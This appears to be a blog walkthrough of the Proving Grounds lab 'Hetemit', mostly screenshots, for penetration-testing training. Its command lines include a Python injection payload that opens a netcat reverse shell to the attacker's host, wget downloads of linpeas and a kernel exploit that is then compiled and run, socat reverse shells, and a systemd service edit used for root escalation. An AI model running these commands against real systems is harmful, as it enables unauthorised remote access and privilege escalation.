---
title: Hetemit
date: 2026-06-21T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - sudo
  - python
  - Caido
  - gobuster
  - ffuf
  - gcc
  - Dirty-Frag
  - reboot
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hetemit"
---
![](Screenshot%202026-06-19%20at%2009.08.17.png)![](Screenshot%202026-06-19%20at%2009.09.56.png)

![](Screenshot%202026-06-19%20at%2009.10.46.png)
![](Screenshot%202026-06-19%20at%2009.11.13.png)
 
![](Screenshot%202026-06-19%20at%2009.18.21.png)

![](Screenshot%202026-06-19%20at%2009.20.10.png)

![](Screenshot%202026-06-22%20at%2013.40.43.png)
![](Screenshot%202026-06-22%20at%2013.41.44.png)

Change the header to a POST request and add:  
`Content-Type: application/x-www-form-urlencoded`

![](Screenshot%202026-06-22%20at%2013.49.18.png)

![](Screenshot%202026-06-22%20at%2011.58.09.png)

Python code can be executed once the header have been manipulated...

```
POST /verify HTTP/1.1
Host: 192.168.122.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Priority: u=0, i

code=2*2
```

`code=os.system("nc 192.168.45.162 80 -e /bin/bash")`

![](Screenshot%202026-06-22%20at%2011.56.58.png)


![](Screenshot%202026-06-21%20at%2012.01.13.png)

Linpeas will show that the kernal is vulnerable to a few exploits. I had success with dirtyfrag.
Kali:  
`linpeas`  
`updog -p 80`
 
Victim:  
`wget http://192.168.45.162/linpeas.sh`  
`chmod +x linpeas.sh`   
`./linpeas.sh`
 
![](Screenshot%202026-06-22%20at%2012.15.10.png)

![](Screenshot%202026-06-22%20at%2012.19.20.png)

I also tried copyfail and PwnKit but dirtyfrag was the one that worked. 

`wget http://192.168.45.162/exp.c`  
`chmod +x exp.c`  
`./exp.c`  
`gcc exp.c -o exp`  
`./exp`

![](Screenshot%202026-06-22%20at%2012.52.17.png)

Not that we have the root, lets do the lab properly.

`sudo -l`

![](Screenshot%202026-06-22%20at%2012.58.04.png)

Sudo reboot privilege escalation:   
https://offsec.pentest.tools/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/

To do this we need a shell that can be used to interact with nano. 

Kali:  
`socat file:`tty`,raw,echo=0 tcp-listen:80`  

![](Screenshot%202026-06-22%20at%2013.10.19.png)

Victim:  
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.162:80`

![](Screenshot%202026-06-22%20at%2013.10.45.png)

`find / -writable -name  "*.service" 2>/dev/null`

![](Screenshot%202026-06-22%20at%2013.13.09.png)

Start a listener in Kali:  
`rlwrap nc -lvnp 211

Victim:  
`nano /etc/systemd/system/pythonapp.service`

Change the user to root and the ExecStart to your revshell:

![](Screenshot%202026-06-22%20at%2013.27.14.png)

Save and exit.

![](Screenshot%202026-06-22%20at%2013.32.41.png)

InitialIy I found this one difficult as I hadn't come across this kind of python injection before.  Once I has a foothold it was pretty straight forward.


